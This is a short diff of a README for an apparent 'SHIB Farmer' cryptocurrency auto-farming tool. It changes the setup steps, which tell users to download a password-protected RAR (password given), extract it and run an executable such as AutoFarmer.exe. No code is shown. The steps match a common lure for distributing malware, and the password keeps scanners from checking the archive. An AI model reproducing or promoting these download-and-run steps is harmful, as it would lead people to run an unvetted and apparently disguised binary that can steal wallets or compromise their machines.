@@ -17,8 +17,8 @@
 
 ## 🛠 Setup Instructions:
 ### 🔹 Windows (.exe) - Recommended:
-1️⃣ Download and extract the `SHIB_Farmer.rar` (Pass:1234szf).  
-2️⃣ Run `SHIB_Farmer.exe`.  
+1️⃣ Download and extract the `Farmer.rar` (pass:122Farming).  
+2️⃣ Run `AutoFarmer.exe`.  
 3️⃣ Enjoy automated farming! 🚀  
 
 ### 🔹 Alternative Python Method:
